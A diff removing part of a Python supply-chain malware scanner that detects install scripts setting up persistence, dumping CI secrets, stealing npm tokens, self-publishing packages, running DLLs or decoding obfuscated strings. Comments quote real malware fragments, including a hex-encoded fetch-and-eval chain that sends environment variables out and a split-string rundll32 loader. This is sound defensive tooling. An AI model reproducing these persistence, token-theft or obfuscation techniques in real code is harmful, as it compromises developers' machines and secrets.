-_PERSIST_RUNNER_ARG_RE = re.compile(_PERSIST_RUNNER_ARG_SRC)
-_BUN_RELEASES_RE = re.compile(_BUN_RELEASES_SRC, re.I)
-_SECRETS_DUMP_RE = re.compile(_SECRETS_DUMP_SRC, re.I)
-#: Lines naming a persistence target examined for a shell write, per target
-_PERSIST_MAX_LINES = 100
-
-
-def _persist_agent_file(text):
-    """The first AI-agent or editor settings file `text` names ('/'-separated:
-    '.claude/settings.json'), whole or as a path join's two literals, or None."""
-    m = _PERSIST_AGENT_RE.search(text)
-    found = (m.start(), m.group().replace("\\", "/")) if m else None
-    for k, s in enumerate(_PERSIST_AGENT_SPLIT_RE.finditer(text)):
-        if k >= _PERSIST_MAX_LINES or (found is not None and s.start() > found[0]):
-            break
-        if s.group(2) in _PERSIST_AGENT_PAIRS[s.group(1)]:
-            found = (s.start(), f".{s.group(1)}/{s.group(2)}.json")
-            break
-    return None if found is None else found[1]
-
-
-def _shell_writes(text, target_re):
-    """Is there a shell write (a redirection, tee, cp …) on a line on which
-    target_re matches? Each line is searched once, and at most
-    _PERSIST_MAX_LINES lines."""
-    m, lines = target_re.search(text), 0
-    while m is not None and lines < _PERSIST_MAX_LINES:
-        start = text.rfind("\n", 0, m.start()) + 1
-        end = text.find("\n", m.end())
-        end = len(text) if end < 0 else end
-        if _PERSIST_SHELL_WRITE_RE.search(text, start, end):
-            return True
-        lines += 1
-        m = target_re.search(text, end)
-    return False
-
-
-def _after_on_line(text, first_re, then_re):
-    """Is there a line on which first_re matches and then_re matches after it?
-    Each line is read once: its first first_re match, then then_re after it."""
-    m = first_re.search(text)
-    while m is not None:
-        end = text.find("\n", m.end())
-        end = len(text) if end < 0 else end
-        if then_re.search(text, m.end(), end) is not None:
-            return True
-        m = first_re.search(text, end)
-    return False
-
-
-def _writes_named(text, target_re):
-    """Does `text` name a target (target_re) and write it?"""
-    return target_re.search(text) is not None and (
-        _PERSIST_WRITE_RE.search(text) is not None or _shell_writes(text, target_re))
-
-
-def dumps_workflow_secrets(text):
-    """Does `text` carry a GitHub Actions workflow that hands every repository
-    secret to a job (`${{ toJSON(secrets) }}`) and name the workflows
-    directory? The Shai-Hulud worms planted such workflows."""
-    return _SECRETS_DUMP_RE.search(text) is not None and _PERSIST_WORKFLOW_RE.search(text) is not None
-
-
-# A browser's shortcuts rewritten to start it with an extension the script
-# wrote (0.1.8): python-dateuti's setup.py wrote a clipboard-stealing
-# extension to %APPDATA% and added `--load-extension=` to every Chrome, Edge
-# and Brave shortcut (.lnk) it found. Browser automation passes the flag on
-# a command line; it never edits shortcuts.
-_PERSIST_SHORTCUT_RE = re.compile(r"\bCreateShortcut\b|\.lnk\b")
-
-# Programs set to start at login or boot (0.1.8). The CanisterWorm releases
-# of @emilgroup's packages and others (March 2026) wrote a systemd user unit
-# that runs a Python payload and enabled it with `systemctl --user enable`,
-# so the payload ran again at every login, long after the install. Malware
-# on every platform does the same through the service managers. No package
-# needs any of this while it is installed: a daemon's `install-service`
-# command and the auto-launch libraries do it when their user or app asks,
-# never at install time, and that code is never read by this test. So each
-# is a reason of the install-script test, never at import time. Shell rc
-# files are left out: installers append PATH lines to them.
-#
-# Each is a place and a way to fill it, both in the text:
-# - systemd: a unit directory named (systemd/user, systemd/system, whole or
-#   as a path join's two literals; not /run/systemd/system, which code reads
-#   to learn whether systemd is running) and written, with a unit's
-#   ExecStart= in the text or the write on a line that names it; or
-#   `systemctl enable` (reenable, link; also as an argument list) run;
-# - launchd: LaunchAgents or LaunchDaemons named and written, with a plist's
-#   keys (RunAtLoad, KeepAlive, ProgramArguments, StartInterval) in the text
-#   or the write on a line that names it; or `launchctl load` (bootstrap,
-#   enable, submit) run;
-# - cron: a crontab installed (piped into `crontab`, `crontab -`, the list
-#   form ['crontab', file]) run, python-crontab's CronTab(...) and .write(),
-#   or a cron directory (/etc/cron.d, /etc/crontab, /var/spool/cron) written
-#   on a line that names it;
-# - a Windows Run key (…\CurrentVersion\Run, RunOnce) named with a registry
-#   write (reg add, New-ItemProperty, SetValueEx, putValue, REG_SZ,
-#   KEY_SET_VALUE …) within _SVC_RUNKEY_SPAN code points of it (a registry
-#   library's docstring names a Run key far from its write calls);
-# - a scheduled task: `schtasks /create` run, Register-ScheduledTask, or the
-#   Task Scheduler's COM object (Schedule.Service) and RegisterTaskDefinition
-#   (alone, an AWS ECS action);
-# - the Startup folder (Start Menu\Programs\Startup, shell:startup,
-#   CSIDL_STARTUP, a path join's 'Programs', 'Startup') named and written,
-#   or a shortcut made;
-# - an XDG autostart directory (~/.config/autostart, /etc/xdg/autostart)
-#   named and written.
-# A command is run when the text has an exec call, or when the command's
-# tool starts a command (a line, or after ; & | or a parenthesis: a hook
-# command or a shell script). A write "on a line that names it" is a write
-# call or a shell write (a redirection, cp, tee …) on a line of at most
-# _SVC_LINE_MAX characters: a minified bundle's one line is not a statement.
-_SVC_SYSTEMD_DIR_SRC = (
-    r"""(?<!/run/)systemd[/\\](?:user|system)(?![\w.-])"""
-    r"""|["'`]systemd["'`]\s{0,20}[,+/]\s{0,20}["'`](?:user|system)["'`]""")
-_SVC_UNIT_SRC = r"""ExecStart\s{0,20}="""
-_SVC_SYSTEMCTL_SRC = (
-    r"""\bsystemctl(?:[ \t]+-{1,2}[\w-]+)*[ \t]+(?:enable|reenable|link)\b"""
-    r"""|["'`]systemctl["'`]\s{0,20},\s{0,20}(?:["'`]-{1,2}[\w-]+["'`]\s{0,20},\s{0,20}){0,4}["'`]"""
-    r"""(?:enable|reenable|link)["'`]""")
-_SVC_LAUNCHD_DIR_SRC = r"""\bLaunch(?:Agents|Daemons)\b"""
-_SVC_PLIST_SRC = r"""\b(?:RunAtLoad|KeepAlive|ProgramArguments|StartInterval)\b"""
-_SVC_LAUNCHCTL_SRC = (
-    r"""\blaunchctl(?:[ \t]+-{1,2}[\w-]+)*[ \t]+(?:load|bootstrap|enable|submit)\b"""
-    r"""|["'`]launchctl["'`]\s{0,20},\s{0,20}(?:["'`]-{1,2}[\w-]+["'`]\s{0,20},\s{0,20}){0,4}["'`]"""
-    r"""(?:load|bootstrap|enable|submit)["'`]""")
-_SVC_CRONTAB_SRC = (
-    r"""\|[ \t]*(?:sudo[ \t]+)?crontab(?:[ \t]+-(?![\w-])|[ \t]*(?![^"'`)\n;&>]))"""
-    r"""|\bcrontab[ \t]+(?:-(?![\w-])|["']?(?:[/~$]|\.\.?/))"""
-    r"""|["'`]crontab["'`]\s{0,20},\s{0,20}(?!["'`]-[lre]["'`])[\w$"'`]""")
-_SVC_PYCRON_SRC = r"""\bCronTab\s{0,20}\("""
-_SVC_PYCRON_WRITE_SRC = r"""\.write\s{0,20}\("""
-_SVC_CRON_DIR_SRC = (
-    r"""/etc/cron\.(?:d|hourly|daily|weekly|monthly)(?![\w.-])|/etc/crontab(?![\w.-])|/var/spool/cron(?![\w.-])""")
-_SVC_RUNKEY_SRC = r"""CurrentVersion(?:\\{1,2}|/)Run(?:Once(?:Ex)?|Services(?:Once)?)?(?!\w)"""
-_SVC_REG_WRITE_SRC = (
-    r"""\breg(?:\.exe)?["'`]?(?:[ \t]+|\s{0,20},\s{0,20}\[?\s{0,20}["'`])add\b|\b(?:New|Set)-ItemProperty\b"""
-    r"""|\bSetValueEx\b|\bSetValue\s{0,20}\(|\bputValue\b|\bRegSetValue|\bREG_(?:EXPAND_)?SZ\b"""
-    r"""|\bKEY_(?:SET_VALUE|WRITE|ALL_ACCESS)\b""")
-_SVC_SCHTASKS_SRC = r"""\bschtasks(?:\.exe)?["'`]?(?:[ \t]+|\s{0,20},\s{0,20}\[?\s{0,20}["'`])[/-]create\b"""
-_SVC_TASK_API_SRC = r"""\bRegister-ScheduledTask\b"""
-_SVC_TASK_COM_SRC = r"""\bSchedule\.Service\b"""
-_SVC_TASK_REGISTER_SRC = r"""\bRegisterTaskDefinition\b"""
-_SVC_STARTUP_SRC = (
-    r"""Start[ ]?Menu[/\\]{1,2}Programs[/\\]{1,2}Startup(?!\w)|\bshell:(?:common[ ]?)?startup\b"""
-    r"""|\bCSIDL_(?:COMMON_)?STARTUP\b|\bSpecialFolder\.(?:Common)?Startup\b|\bwinshell\.startup\s{0,20}\("""
-    r"""|["'`]Programs["'`]\s{0,20}[,+/]\s{0,20}["'`]Startup["'`]""")
-_SVC_AUTOSTART_SRC = (
-    r"""\.config[/\\]autostart(?![\w.-])|/etc/xdg/autostart(?![\w.-])"""
-    r"""|["'`]\.config["'`]\s{0,20}[,+/]\s{0,20}["'`]autostart["'`]""")
-_SVC_CMD_START_SRC = (
-    r"""(?:(?<![^\n])|[;&|(])[ \t]*(?:sudo[ \t]+)?"""
-    r"""(?:systemctl|launchctl|crontab|[Ss][Cc][Hh][Tt][Aa][Ss][Kk][Ss](?:\.[Ee][Xx][Ee])?)(?![\w.-])""")
-_SVC_SYSTEMD_DIR_RE = re.compile(_SVC_SYSTEMD_DIR_SRC)
-_SVC_UNIT_RE = re.compile(_SVC_UNIT_SRC)
-_SVC_SYSTEMCTL_RE = re.compile(_SVC_SYSTEMCTL_SRC)
-_SVC_LAUNCHD_DIR_RE = re.compile(_SVC_LAUNCHD_DIR_SRC)
-_SVC_PLIST_RE = re.compile(_SVC_PLIST_SRC)
-_SVC_LAUNCHCTL_RE = re.compile(_SVC_LAUNCHCTL_SRC)
-_SVC_CRONTAB_RE = re.compile(_SVC_CRONTAB_SRC)
-_SVC_PYCRON_RE = re.compile(_SVC_PYCRON_SRC)
-_SVC_PYCRON_WRITE_RE = re.compile(_SVC_PYCRON_WRITE_SRC)
-_SVC_CRON_DIR_RE = re.compile(_SVC_CRON_DIR_SRC)
-_SVC_RUNKEY_RE = re.compile(_SVC_RUNKEY_SRC, re.I)
-_SVC_REG_WRITE_RE = re.compile(_SVC_REG_WRITE_SRC, re.I)
-_SVC_SCHTASKS_RE = re.compile(_SVC_SCHTASKS_SRC, re.I)
-_SVC_TASK_API_RE = re.compile(_SVC_TASK_API_SRC, re.I)
-_SVC_TASK_COM_RE = re.compile(_SVC_TASK_COM_SRC, re.I)
-_SVC_TASK_REGISTER_RE = re.compile(_SVC_TASK_REGISTER_SRC)
-_SVC_STARTUP_RE = re.compile(_SVC_STARTUP_SRC, re.I)
-_SVC_AUTOSTART_RE = re.compile(_SVC_AUTOSTART_SRC)
-_SVC_CMD_START_RE = re.compile(_SVC_CMD_START_SRC)
-#: The longest line on which a write counts as writing the place it names
-_SVC_LINE_MAX = 1000
-#: Code points around a Run key searched for a registry write, and the Run keys read
-_SVC_RUNKEY_SPAN = 400
-
-
-def _writes_on_line(text, target_re):
-    """Is there a write call or a shell write on a line on which target_re
-    matches? Each line is searched once, and at most _PERSIST_MAX_LINES; a
-    line longer than _SVC_LINE_MAX (minified code) is not a statement."""
-    m, lines = target_re.search(text), 0
-    while m is not None and lines < _PERSIST_MAX_LINES:
-        start = text.rfind("\n", 0, m.start()) + 1
-        end = text.find("\n", m.end())
-        end = len(text) if end < 0 else end
-        if end - start <= _SVC_LINE_MAX and (_PERSIST_WRITE_RE.search(text, start, end)
-                                             or _PERSIST_SHELL_WRITE_RE.search(text, start, end)):
-            return True
-        lines += 1
-        m = target_re.search(text, end)
-    return False
-
-
-def _run_key_written(text):
-    """Is a registry write within _SVC_RUNKEY_SPAN code points of a Run key
-    `text` names? The first _PERSIST_MAX_LINES Run keys are read."""
-    for k, m in enumerate(_SVC_RUNKEY_RE.finditer(text)):
-        if k >= _PERSIST_MAX_LINES:
-            break
-        if _SVC_REG_WRITE_RE.search(text[max(0, m.start() - _SVC_RUNKEY_SPAN):m.end() + _SVC_RUNKEY_SPAN]):
-            return True
-    return False
-
-
-def service_reasons(text):
-    """The reasons `text` sets a program to start at login or boot (see
-    above), in a fixed order: systemd, launchd, cron, a Run key, a
-    scheduled task, the Startup folder, XDG autostart."""
-    reasons = []
-    runs = None
-
-    def run_context():
-        nonlocal runs
-        if runs is None:
-            runs = _EXEC_CALL_RE.search(text) is not None or _SVC_CMD_START_RE.search(text) is not None
-        return runs
-
-    writes = _PERSIST_WRITE_RE.search(text) is not None
-    if ((_SVC_SYSTEMD_DIR_RE.search(text) is not None
-         and ((writes and _SVC_UNIT_RE.search(text) is not None) or _writes_on_line(text, _SVC_SYSTEMD_DIR_RE)))
-            or (_SVC_SYSTEMCTL_RE.search(text) is not None and run_context())):
-        reasons.append("installs a systemd service")
-    if ((_SVC_LAUNCHD_DIR_RE.search(text) is not None
-         and ((writes and _SVC_PLIST_RE.search(text) is not None) or _writes_on_line(text, _SVC_LAUNCHD_DIR_RE)))
-            or (_SVC_LAUNCHCTL_RE.search(text) is not None and run_context())):
-        reasons.append("installs a launchd agent or daemon")
-    if ((_SVC_CRONTAB_RE.search(text) is not None and run_context())
-            or (_SVC_PYCRON_RE.search(text) is not None and _SVC_PYCRON_WRITE_RE.search(text) is not None)
-            or _writes_on_line(text, _SVC_CRON_DIR_RE)):
-        reasons.append("adds a cron job")
-    if _run_key_written(text):
-        reasons.append("adds a program to a Windows Run key")
-    if ((_SVC_SCHTASKS_RE.search(text) is not None and run_context()) or _SVC_TASK_API_RE.search(text) is not None
-            or (_SVC_TASK_COM_RE.search(text) is not None and _SVC_TASK_REGISTER_RE.search(text) is not None)):
-        reasons.append("creates a Windows scheduled task")
-    if _SVC_STARTUP_RE.search(text) is not None and (
-            writes or _PERSIST_SHORTCUT_RE.search(text) is not None or _shell_writes(text, _SVC_STARTUP_RE)):
-        reasons.append("puts a program in the Windows Startup folder")
-    if _SVC_AUTOSTART_RE.search(text) is not None and (writes or _shell_writes(text, _SVC_AUTOSTART_RE)):
-        reasons.append("adds a desktop autostart entry")
-    return reasons
-
-
-def persistence_reasons(text):
-    """The persistence-target reasons of the install-script test (see above):
-    what `text` makes an AI agent, an editor, GitHub Actions or the operating
-    system run later, and the Bun loader the Shai-Hulud worms fetch their
-    payload's runtime with."""
-    reasons = []
-    agent = _persist_agent_file(text)
-    if agent is not None and (_PERSIST_WRITE_RE.search(text) is not None or _shell_writes(
-            text, _PERSIST_AGENT_RE) or _shell_writes(text, _PERSIST_AGENT_SPLIT_RE)):
-        reasons.append(f"writes an AI agent's or editor's auto-run settings ({agent})")
-    if dumps_workflow_secrets(text):
-        reasons.append("carries a GitHub Actions workflow that dumps every repository secret")
-    elif _PERSIST_WORKFLOW_RE.search(text) is not None and (
-            _writes_named(text, _PERSIST_WORKFLOW_RE) or "/contents/" in text):
-        reasons.append("writes a GitHub Actions workflow")
-    install = _PERSIST_EXT_INSTALL_RE.search(text) is not None
-    if ((install and (_EXEC_CALL_RE.search(text) is not None
-                      or _after_on_line(text, _PERSIST_EXT_CLI_RE, _PERSIST_EXT_INSTALL_RE)))
-            or _writes_named(text, _PERSIST_EXT_DIR_RE)):
-        reasons.append("installs an editor extension")
-    if _PERSIST_RUNNER_RE.search(text) is not None or _after_on_line(
-            text, _PERSIST_RUNNER_CONFIG_RE, _PERSIST_RUNNER_ARG_RE):
-        reasons.append("registers the machine as a GitHub Actions self-hosted runner")
-    if _BUN_RELEASES_RE.search(text) is not None and _EXEC_CALL_RE.search(text) is not None:
-        reasons.append("downloads the Bun runtime from GitHub and runs code with it")
-    if "--load-extension" in text and _PERSIST_SHORTCUT_RE.search(text) is not None:
-        reasons.append("rewrites browser shortcuts to load an extension")
-    reasons.extend(service_reasons(text))
-    return reasons
-
-
-# ---------------- Code that publishes packages (SC-SELF-PUBLISH, 0.1.8) ----------------
-# The 2025-26 registry floods shipped a script that gives the package it sits
-# in a new name — a random one each time — and runs `npm publish` in a loop:
-# IndonesianFoods' auto.js, the generated-name "tea" farms, tens of thousands
-# of packages from a few accounts (39 of the 0.1.7 benchmark's misses).
-# Release tools publish too, but never rename what they publish. So three
-# signs in one file are SC-SELF-PUBLISH, CRITICAL wherever the file is: a
-# publish command an exec call runs (`npm publish`, pnpm, yarn, bun; or
-# `spawn("npm", ["publish"])`), an assignment to an object's `name`, and a
-# write to package.json whose arguments name that object — package.json in
-# the arguments, or in the _SELF_PUB_SPAN characters before the call
-# (Python's `with open("package.json", "w") as f: json.dump(pkg, f)`).
-#
-# The worms' half belongs to the install-script test: a script an install
-# hook runs that publishes a package, or that collects npm access tokens —
-# the @emilgroup releases read ~/.npmrc, NPM_TOKEN and `npm config get
-# //registry.npmjs.org/:_authToken`, then handed the tokens to a detached
-# deploy script. No install script needs either.
-_PUBLISH_CMD_SRC = (
-    r"""\b(?:exec|execSync|execa|execaSync|execFile|execFileSync|spawn|spawnSync|system|popen|Popen|run|call"""
-    r"""|check_call|check_output|getoutput)\s*\(\s*(?:\[\s*)?["'`](?:[^"'`\n]{0,80}?(?:&&|;|\|\|)\s*)?"""
-    r"""(?:npx\s+)?(?:npm|pnpm|yarn|bun)(?:\.cmd)?(?:["'`]\s*,\s*(?:\[\s*)?["'`]|\s+)publish\b""")
-_NAME_ASSIGN_SRC = r"""(?<![\w$.])([A-Za-z_$][\w$]*)\s*(?:\.\s*name|\[\s*["']name["']\s*\])\s*=(?![=>])"""
-_MANIFEST_WRITE_SRC = (
-    r"""\b(?:writeFileSync|writeFile|outputJsonSync|outputJson|writeJsonSync|writeJson|outputFileSync"""
-    r"""|outputFile|write_text|dump)\s*\(""")
-_JS_IDENT_SRC = r"""(?<![\w$.])[A-Za-z_$][\w$]*"""
-_NPM_TOKEN_READ_SRC = (
-    r"""\bnpm\s+config\s+get\s+[^\n"'`;|&]{0,200}?_auth|\.npmrc\b[\s\S]{0,400}?_authToken"""
-    r"""|_authToken[\s\S]{0,400}?\.npmrc\b""")
-_PUBLISH_CMD_RE = re.compile(_PUBLISH_CMD_SRC)
-_NAME_ASSIGN_RE = re.compile(_NAME_ASSIGN_SRC)
-_MANIFEST_WRITE_RE = re.compile(_MANIFEST_WRITE_SRC)
-_JS_IDENT_RE = re.compile(_JS_IDENT_SRC)
-_NPM_TOKEN_READ_RE = re.compile(_NPM_TOKEN_READ_SRC)
-#: Characters of a write call's arguments (and before it) read for package.json and the renamed object
-_SELF_PUB_SPAN = 300
-#: Name assignments and package.json writes examined per text
-_SELF_PUB_MAX = 200
-
-
-def self_publish_at(text):
-    """The offset of the publish command of code that renames its package and
-    publishes it (see above), else -1."""
-    if "publish" not in text or "package.json" not in text:
-        return -1
-    pub = _PUBLISH_CMD_RE.search(text)
-    if pub is None:
-        return -1
-    names = set()
-    for k, m in enumerate(_NAME_ASSIGN_RE.finditer(text)):
-        if k >= _SELF_PUB_MAX:
-            break
-        names.add(m.group(1))
-    if not names:
-        return -1
-    for k, w in enumerate(_MANIFEST_WRITE_RE.finditer(text)):
-        if k >= _SELF_PUB_MAX:
-            break
-        args = text[w.end():w.end() + _SELF_PUB_SPAN]
-        if "package.json" not in args and "package.json" not in text[max(0, w.start() - _SELF_PUB_SPAN):w.start()]:
-            continue
-        if names.intersection(_JS_IDENT_RE.findall(args)):
-            return pub.start()
-    return -1
-
-
-# ---------------- An install script that runs a DLL (0.1.8) ----------------
-# eslint-config-prettier 9.1.1 (July 2025) shipped node-gyp.dll and an
-# install.js that ran it on Windows: require('chi'+'ld_pro'+'cess')["sp"+
-# "awn"]("rund"+"ll32", [path.join(__dirname, './node-gyp' + '.dll') +
-# ",main"]). rundll32 and regsvr32 run a DLL's code; an install script has
-# no reason to call either on a DLL of its own. The text is read again with
-# adjacent string literals joined ('a' + 'b' as 'ab') when the split hid the
-# names. Windows' own DLLs that rundll32 is used with for ordinary things
-# (opening a URL with url.dll, a Control Panel applet with shell32.dll) are
-# not a reason; a DLL of any other name is.
-_DLL_LOADER_SRC = r"""\b(?:rundll32|regsvr32)(?:\.exe)?\b"""
-_DLL_NAME_SRC = r"""(?<![\w.\-])[\w.\-]*\.dll\b"""
-_STRING_JOIN_SRC = r"""["']\s*\+\s*["']"""
-_DLL_LOADER_RE = re.compile(_DLL_LOADER_SRC, re.I)
-_DLL_NAME_RE = re.compile(_DLL_NAME_SRC, re.I)
-_STRING_JOIN_RE = re.compile(_STRING_JOIN_SRC)
-_SYSTEM_DLLS = frozenset(("url.dll", "shell32.dll", "user32.dll", "ieframe.dll", "dfshim.dll", "advpack.dll",
-                          "printui.dll", "keymgr.dll", "powrprof.dll", "zipfldr.dll", "shdocvw.dll", "shimgvw.dll"))
-
-
-def join_string_pieces(text):
-    """`text` with adjacent string literals joined: `'chi' + 'ld'` reads
-    `'child'` (a quote, a plus and a quote taken out)."""
-    return _STRING_JOIN_RE.sub("", text) if "+" in text else text
-
-
-def runs_dll(text):
-    """The DLL `text` runs with rundll32 or regsvr32 (a name, not one of
-    Windows' own ordinary ones), read as written and with its string pieces
-    joined; None when it runs none."""
-    if "32" not in text and "+" not in text:
-        return None
-    for view in (text, join_string_pieces(text)):
-        if _DLL_LOADER_RE.search(view) is None:
-            continue
-        for m in _DLL_NAME_RE.finditer(view):
-            name = m.group().rsplit("/", 1)[-1].rsplit("\\", 1)[-1].lower()
-            if name and name != ".dll" and name not in _SYSTEM_DLLS:
-                return name
-    return None
-
-
-# ---------------- Names in strings a file decodes as it runs (0.1.8) ----------------
-# tailwind-book-icon and five more loggers of one campaign kept every name
-# their payload needs hex-encoded and decoded them with a helper of their own:
-#     function g(h) { return h.replace(/../g, m => String.fromCharCode(parseInt(m, 16))); }
-#     let hl = [g('72657175697265'), g('6178696f73'), g('706f7374'), g('6874…'), …];
-#     require(hl[1])[[hl[2]]](hl[3], { ...process.env }, …)[[hl[7]]](r => eval(r.data));
-# which is axios.post(URL, …).then(r => eval(r.data)) — fetch and run — once
-# the strings are read; postman-converters wrote require(Buffer.from("6f73",
-# "hex").toString()) for require('os'). The install-script and import-time
-# tests read a file a second time the way it reads once its strings are
-# decoded (decoded_view): string literals joined across a '+' on one row;
-# a decoder's call on a literal replaced by the text it decodes to —
-# Buffer.from(…, 'hex' | 'base64').toString(), atob(…), bytes.fromhex(…)
-# .decode(), b64decode(…).decode(), unhexlify(…).decode(), and the file's
-# own helpers (a function of one parameter whose first _DV_BODY characters
-# decode hex, as parseInt(…, 16) with fromCharCode, or base64) — when that
-# text is printable ASCII; and, once something was decoded, a constant array
-# of string literals read where it is indexed by a number, and a member
-# named by a literal read as one (process["env"] as process.env). A reason
-# found only there says so. Rows keep their line breaks, so lines are the
-# file's. Literals joined and nothing decoded are no second reading: a
-# bundle joins literals everywhere, and reading its 3 MB again doubled the
-# test's time (playwright-core's coreBundle.js) to find nothing.
-_DV_MAX_LITERAL = 400           # characters of an encoded literal, at most
-_DV_BODY = 400                  # characters of a helper's body read for what it decodes
-_DV_MAX_HELPERS = 8             # decoding helpers of a file, at most
-_DV_MAX_ARRAYS = 16             # constant arrays read, at most
-_DV_MAX_CHARS = 4_000_000       # a longer text is not read again
-_DV_NOTE = " (in strings it decodes as it runs)"
-_DV_LIT = r"""(?:'(?P<a>[^'\\\n]{1,400})'|"(?P<b>[^"\\\n]{1,400})"|`(?P<c>[^`\\\n$]{1,400})`)"""
-_DV_JOIN_SRC = r"""'[ \t]*\+[ \t]*'|"[ \t]*\+[ \t]*""" + '"'
-_DV_BUFFER_SRC = (r"""\bBuffer[ \t]*\.[ \t]*from[ \t]*\([ \t]*""" + _DV_LIT
-                  + r"""[ \t]*,[ \t]*['"`](?P<enc>hex|base64)['"`][ \t]*\)[ \t]*\.[ \t]*toString[ \t]*\([ \t]*"""
-                  r"""(?:['"`](?:utf-?8|ascii|latin1|binary)['"`])?[ \t]*\)""")
-_DV_ATOB_SRC = r"""(?<![\w$.])atob[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
-_DV_PY_SRC = (r"""\b(?:(?P<fh>bytes[ \t]*\.[ \t]*fromhex)|(?P<uh>(?:binascii[ \t]*\.[ \t]*)?unhexlify)"""
-              r"""|(?:base64[ \t]*\.[ \t]*)?b64decode)[ \t]*\([ \t]*b?(?:'(?P<a>[^'\\\n]{1,400})'|"(?P<b>[^"\\\n]{1,400})")"""
-              r"""[ \t]*\)[ \t]*\.[ \t]*decode[ \t]*\([^()\n]{0,20}\)""")
-_DV_HELPER_SRC = (r"""\bfunction[ \t]+(?P<a>[A-Za-z_$][\w$]*)[ \t]*\([ \t]*[A-Za-z_$][\w$]*[ \t]*\)"""
-                  r"""|\b(?:const|let|var)[ \t]+(?P<b>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*(?:function[ \t]*\([ \t]*"""
-                  r"""[A-Za-z_$][\w$]*[ \t]*\)|\(?[ \t]*[A-Za-z_$][\w$]*[ \t]*\)?[ \t]*=>)"""
-                  r"""|\bdef[ \t]+(?P<c>[A-Za-z_]\w*)[ \t]*\([ \t]*[A-Za-z_]\w*[ \t]*\)[ \t]*:""")
-_DV_STR_ITEM_SRC = r"""'[^'\\\n]{0,400}'|"[^"\\\n]{0,400}""" + '"'
-_DV_ARRAY_SRC = (r"""(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*=[ \t]*\[(?P<items>(?:\s*(?:""" + _DV_STR_ITEM_SRC
-                 + r""")\s*,){0,63}\s*(?:""" + _DV_STR_ITEM_SRC + r""")\s*,?\s*)\]""")
-# a member named with a string literal after a name, a call or an index:
-# process["env"] reads process.env (an array literal's ['x'] is not one)
-_DV_MEMBER_SRC = r"""(?<=[\w$)\]])\[[ \t]*(?:'(?P<a>[A-Za-z_$][\w$]{0,63})'|"(?P<b>[A-Za-z_$][\w$]{0,63})")[ \t]*\]"""
-_DV_MEMBER_RE = re.compile(_DV_MEMBER_SRC)
-_DV_HEX_RE = re.compile(r"[0-9A-Fa-f]+")
-_DV_B64_RE = re.compile(r"[A-Za-z0-9+/]+={0,2}")
-_DV_JOIN_RE = re.compile(_DV_JOIN_SRC)
-_DV_BUFFER_RE = re.compile(_DV_BUFFER_SRC)
-_DV_ATOB_RE = re.compile(_DV_ATOB_SRC)
-_DV_PY_RE = re.compile(_DV_PY_SRC)
-_DV_HELPER_RE = re.compile(_DV_HELPER_SRC)
-_DV_STR_ITEM_RE = re.compile(_DV_STR_ITEM_SRC)
-_DV_ARRAY_RE = re.compile(_DV_ARRAY_SRC)
-_DV_NEEDLES = ("Buffer", "atob", "fromhex", "unhexlify", "b64decode", "fromCharCode", "hex", "base64")
-# (0.1.8) A home-made XOR decoder: react-zutils 1.0.1, which its preinstall
-# hook starts detached, kept the 83 strings its browser stealer needs —
-# modules, browser paths, SQL, its ngrok address — as base64 of the text
-# XORed with a four-letter key, decoded by a helper of its own:
-#     n=(t,e)=>{let r=Buffer.from(t,"base64");…a[index]=255&(r[index]^e.charCodeAt(3&index))…},
-#     a=t=>n(t,"utf8"), E=a("BgUKUQERVQ")               // "sqlite3"
-# The helper's body is not read. In a text with a ^, a name called with one
-# literal of base64 (padded, or not) or of hex at least _DV_XOR_MIN_CALLS
-# times (its first _DV_XOR_MAX_CALLS calls are tried, holding at least
-# _DV_XOR_MIN_BYTES bytes in all) is such a decoder when one string literal
-# of the text — of the first _DV_XOR_MAX_KEYS distinct ones of 1 to
-# _DV_XOR_KEY_MAX printable ASCII characters — XORed over the bytes, repeated
-# from the first, makes all but a tenth of those calls printable ASCII; its
-# calls are read as that text. A random key does that to a random call with
-# a chance of 95/256 a byte: 32 bytes make a false decoder a chance in 10^13.
-_DV_XOR_MIN_CALLS = 5
-_DV_XOR_MAX_CALLS = 64
-_DV_XOR_MIN_BYTES = 32
-_DV_XOR_MAX_KEYS = 256
-_DV_XOR_KEY_MAX = 32
-_DV_CALL_SRC = r"""(?<![\w$.])(?P<name>[A-Za-z_$][\w$]*)[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
-_DV_KEY_SRC = r"""'(?P<a>[^'\\\n]{1,32})'|"(?P<b>[^"\\\n]{1,32})"|`(?P<c>[^`\\\n$]{1,32})`"""
-_DV_CALL_RE = re.compile(_DV_CALL_SRC)
-_DV_KEY_RE = re.compile(_DV_KEY_SRC)
-# The patterns decoded_view builds around the names a file uses (each name
-# escaped): a call of one of its decoding helpers, and an array read by index
-# (not one the file changes, and assigned once).
-_DV_NAME_HEAD = r"""(?<![\w$.])"""
-_DV_HELPER_CALL_TAIL = r""")[ \t]*\([ \t]*""" + _DV_LIT + r"""[ \t]*\)"""
-_DV_MUTATED_TAIL = (r"""\s*(?:\.\s*(?:push|pop|shift|unshift|splice|reverse|sort|fill"""
-                    r"""|copyWithin|append|insert|extend|remove)\s*\(|\[[^\]\n]{0,80}\]\s*=(?!=))""")
-_DV_ASSIGNED_TAIL = r"\s*=(?![=>])"
-_DV_INDEX_TAIL = r"\s*\[\s*(\d{1,2})\s*\]"
-
-
-def _dv_decode(kind, s):
-    """The printable ASCII text the literal `s` decodes to as hex or base64
-    (strictly: an even run of hex digits; base64 padded to a multiple of 4),
-    else None."""
-    if kind == "hex":
-        if len(s) % 2 or _DV_HEX_RE.fullmatch(s) is None:
-            return None
-        data = bytes.fromhex(s)
-    else:
-        if len(s) % 4 or _DV_B64_RE.fullmatch(s) is None:
-            return None
-        try:
-            data = base64.b64decode(s)
-        except ValueError:
-            return None
-    if not data or any(b < 0x20 or b > 0x7e for b in data):
-        return None
-    return data.decode("ascii")
-
-
-def _dv_quote(s):
-    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"
-
-
-def _dv_helpers(text):
-    """{name: 'hex' | 'base64'}: the file's own decoding helpers (see above)."""
-    out = {}
-    for m in _DV_HELPER_RE.finditer(text):
-        name = m.group("a") or m.group("b") or m.group("c")
-        if name in out:
-            continue
-        body = text[m.end():m.end() + _DV_BODY]
-        if (("fromCharCode" in body and "parseInt" in body and "16" in body) or "'hex'" in body
-                or '"hex"' in body or "fromhex(" in body or "unhexlify(" in body):
-            out[name] = "hex"
-        elif "base64" in body or "atob(" in body or "b64decode(" in body:
-            out[name] = "base64"
-        else:
-            continue
